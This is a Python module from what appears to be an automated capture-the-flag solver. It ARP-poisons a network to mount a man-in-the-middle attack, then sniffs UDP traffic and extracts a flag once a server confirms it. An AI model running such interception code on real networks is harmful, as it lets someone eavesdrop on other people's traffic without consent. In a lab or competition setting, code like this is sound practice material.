# coding: utf-8
import scapy.all as scapy
import capture
import strategy
import logging
import re

logger = logging.getLogger(__name__)

class Strategy(strategy.Strategy):
    """
    This strategy solves the 'middle'/'example' challenge challenge through by
    ARP poisoning the network and performing to perform a MITM attack. It then watches
    the bidirectional flow of UDP packets until it sees a positive response to the flag.
    """
    name = "ARP poison and wait"
    needsip = True
    challenges = ['example', 'middle']

    class AnalysisModule(capture.Module):
        """AnalysisModule watches the request and response in this challenge and watches for a confirmed flag"""
        def __init__(self, flagpattern):
            self.flagpattern = flagpattern
            self.question = None
            self.flag = None
            self.sniffer = None

        def start(self, sniffer):
            self.sniffer = sniffer

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.UDP, scapy.Raw)):
                logger.debug(pkt.sprintf('%IP.src%: %Raw.load%'))

                try:
                    load = pkt.load.decode('utf-8')
                except UnicodeDecodeError:
                    return

                m = re.search(self.flagpattern, load)
                if m:
                    self.question = m.group(0)
                elif 'Yup' in load and self.question is not None:
                    self.flag = self.question
                    self.sniffer.stop()

    def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
        sniffer = capture.Sniffer(iface=iface)
        analyser = self.AnalysisModule(flagpattern)
        sniffer.register(
            analyser,
            capture.ArpMitmModule()
        )

        if canceltoken is not None:
            canceltoken.fork(oncancel=sniffer.stop)

        sniffer.run()
        return analyser.flag
